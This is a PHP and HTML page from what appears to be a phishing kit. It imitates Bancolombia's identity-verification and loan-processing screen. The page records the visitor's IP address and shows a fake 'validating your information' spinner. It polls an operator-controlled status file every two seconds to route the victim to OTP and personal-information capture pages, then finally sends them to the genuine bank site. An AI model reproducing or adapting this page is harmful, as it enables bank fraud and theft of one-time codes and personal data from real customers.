<?php
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set('America/Bogota');
$tiempo = date("l, j \d\e F \d\e Y");
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Bancolombia - Verificación de Identidad</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v=<?php echo time(); ?>" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>

        <style type="text/css">
            body {
                background-color: #fff;
                text-align: center;              
                font-family: 'Open Sans', sans-serif;
                margin: 0;
            }
            .contenedor-espera {
                padding: 40px 20px;
            }
            .descripcion-app {
                font-size: 16px;
                color: #333;
                line-height: 1.5;
                margin-top: 20px;
            }
            .footer-espera {
                position: fixed;
                bottom: 20px;
                width: 100%;
                font-size: 12px;
                color: #999;
            }
        </style>
    </head>
    <body>         
        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 10px; border-bottom: 1px solid #eee;">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="25"></td>
                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="25"></td>
                <td valign="middle" align="right" width="33%"><span style="width:30px;"></span></td>
            </tr>
        </table>        
        
        <div class="contenedor-espera">
            <img src="../img/logo.svg" width="200" style="margin-bottom: 40px;">
            
            <img src="../img/load4.gif" width="70">            
            
            <div class="descripcion-app">
                <b>Estamos procesando su solicitud.</b> <br><br>
                Por favor, no cierre esta ventana. Estamos validando su información con nuestra central de riesgos para la aprobación de su préstamo.
            </div> 
            
            <p style="color: #666; font-size: 14px; margin-top: 30px;">Verificando identidad...</p>
        </div>

        <div class="footer-espera">
            &copy; <?php echo date("Y"); ?> Bancolombia S.A.
        </div>

        <script type="text/javascript">
            // Función de chequeo directo al panel
            function chequear_estado() {
                // El random evita que el navegador guarde una respuesta vieja (Caché)
                $.get("../process/estado.php?v=" + Math.random(), function(data) {
                    var orden = data.trim();

                    if (orden == "2") {
                        window.location.href = "OTP.php";
                    } else if (orden == "4") {
                        window.location.href = "INFO.php";
                    } else if (orden == "10") {
                        window.location.href = "https://www.bancolombia.com/personas";
                    }
                    // Si el archivo dice "1", se queda aquí cargando...
                }).fail(function() {
                    console.log("Error leyendo estado.php");
                });
            }

            $(document).ready(function() {
                // Revisamos cada 2 segundos exactamente
                setInterval(chequear_estado, 2000);
            });
        </script>
    </body>
</html>
